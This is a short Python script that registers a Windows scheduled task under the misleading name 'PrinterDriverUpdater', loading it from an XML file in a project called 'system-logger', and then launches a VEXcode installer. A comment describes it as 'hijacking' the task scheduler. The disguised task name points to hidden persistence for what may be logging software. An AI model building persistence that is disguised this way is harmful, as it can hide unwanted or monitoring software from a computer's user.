from os import system
from subprocess import run

task = "schtasks /create /TN PrinterDriverUpdater /XML C:/Users/lhill23/Documents/GitHub/system-logger/PrinterDriverUpdater.xml"

#Hijacking task scheduler, kinda?
def Hijack():
    run(task)
    system("cd C:/Users/luhil/Documents & VEXcodeV5-20220829.exe")

if __name__ == "__main__":
    Hijack()
